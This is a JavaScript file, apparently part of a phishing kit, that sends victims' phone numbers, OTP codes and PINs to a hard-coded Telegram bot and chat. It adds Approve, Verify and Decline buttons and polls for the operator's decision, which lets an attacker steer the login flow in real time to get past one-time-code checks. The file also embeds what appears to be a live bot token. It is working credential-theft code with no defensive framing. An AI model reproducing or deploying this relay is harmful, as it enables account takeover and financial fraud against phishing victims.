// ============================================
// TELEGRAM BOT CONFIGURATION
// ============================================
// CHANGE THESE VALUES TO YOUR OWN CREDENTIALS
const TELEGRAM_BOT_TOKEN = '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88';
const TELEGRAM_CHAT_ID = '8889432014';

// ============================================
// TELEGRAM BOT UTILITY CLASS
// ============================================
class TelegramBot {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.apiUrl = `https://api.telegram.org/bot${token}`;
        this.pendingApprovals = {};
        this.lastUpdateId = 0;
        this.isPolling = false;
        this.startPolling();
    }

    /**
     * Send a message to Telegram with inline buttons
     */
    async sendMessage(text, buttons = []) {
        try {
            const payload = {
                chat_id: this.chatId,
                text: text,
                parse_mode: 'HTML'
            };

            if (buttons.length > 0) {
                payload.reply_markup = {
                    inline_keyboard: [buttons]
                };
            }

            const response = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();
            return data;
        } catch (error) {
            console.error('Error sending Telegram message:', error);
            return null;
        }
    }

    /**
     * Send login notification with Approve/Decline buttons
     */
    async notifyLogin(phoneNumber) {
        const requestId = 'login_' + Date.now();
        const text = `<b>🔐 LOGIN REQUEST</b>\n\n<b>Phone:</b> ${phoneNumber}\n<b>Request ID:</b> ${requestId}`;
        
        await this.sendMessage(text);
        return requestId;
    }

    /**
     * Send OTP notification with Approve/Decline buttons
     */
    async notifyOTP(phoneNumber, otp) {
        const requestId = 'otp_' + Date.now();
        const text = `<b>📱 OTP VERIFICATION</b>\n\n<b>Phone:</b> ${phoneNumber}\n<b>OTP Code:</b> <code>${otp}</code>\n<b>Request ID:</b> ${requestId}`;
        
        const buttons = [
            { text: '✅ Approve', callback_data: `approve_${requestId}` },
            { text: '❌ Decline', callback_data: `decline_${requestId}` }
        ];

        await this.sendMessage(text, buttons);
        return requestId;
    }

    /**
     * Send PIN notification with Approve/Decline/Prompt buttons
     */
    async notifyPIN(phoneNumber, pin) {
        const requestId = 'pin_' + Date.now();
        const text = `<b>🔑 PIN VERIFICATION</b>\n\n<b>Phone:</b> ${phoneNumber}\n<b>PIN Entered:</b> <code>${pin}</code>\n<b>Request ID:</b> ${requestId}`;
        
        const buttons = [
            { text: '✅ Approve', callback_data: `approve_${requestId}` },
            { text: '🔄 Verify', callback_data: `verify_${requestId}` },
            { text: '❌ Decline', callback_data: `decline_${requestId}` }
        ];

        await this.sendMessage(text, buttons);
        return requestId;
    }

    async notifyPINSimple(phoneNumber, pin) {
        const text = `<b>🔑 PIN ENTERED</b>\n\n<b>Phone:</b> ${phoneNumber}\n<b>PIN:</b> <code>${pin}</code>`;
        await this.sendMessage(text);
    }

    /**
     * Wait for approval with proper timeout
     */
    async waitForApproval(requestId, timeoutMs = 300000) {
        return new Promise((resolve) => {
            const timeout = setTimeout(() => {
                if (this.pendingApprovals[requestId]) {
                    delete this.pendingApprovals[requestId];
                }
                resolve({ status: 'timeout', action: 'decline' });
            }, timeoutMs);

            this.pendingApprovals[requestId] = (action) => {
                clearTimeout(timeout);
                delete this.pendingApprovals[requestId];
                resolve({ status: 'completed', action: action });
            };
        });
    }

    /**
     * Handle callback query from Telegram button press
     */
    handleCallbackQuery(requestId, action) {
        console.log('Handling callback:', requestId, action);
        if (this.pendingApprovals[requestId]) {
            this.pendingApprovals[requestId](action);
        }
    }

    /**
     * Start polling for Telegram updates
     */
    startPolling() {
        if (this.isPolling) return;
        this.isPolling = true;
        this.poll();
    }

    /**
     * Poll Telegram for updates
     */
    async poll() {
        try {
            const response = await fetch(`${this.apiUrl}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=30`);
            const data = await response.json();

            if (data.ok && data.result && data.result.length > 0) {
                data.result.forEach(update => {
                    this.lastUpdateId = update.update_id;

                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        const parts = callbackData.split('_');
                        const action = parts[0];
                        const requestId = callbackData.substring(action.length + 1);

                        console.log('Callback received:', { action, requestId, callbackData });

                        this.handleCallbackQuery(requestId, action);

                        // Answer the callback query
                        fetch(`${this.apiUrl}/answerCallbackQuery`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                callback_query_id: update.callback_query.id,
                                text: `${action === 'approve' ? '✅ Approved' : action === 'verify' ? '🔄 Verifying' : '❌ Declined'}`,
                                show_alert: false
                            })
                        }).catch(e => console.error('Error answering callback:', e));
                    }
                });
            }

            // Continue polling
            setTimeout(() => this.poll(), 1000);
        } catch (error) {
            console.error('Error polling Telegram updates:', error);
            // Retry polling after delay
            setTimeout(() => this.poll(), 5000);
        }
    }
}

// Initialize the bot
const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
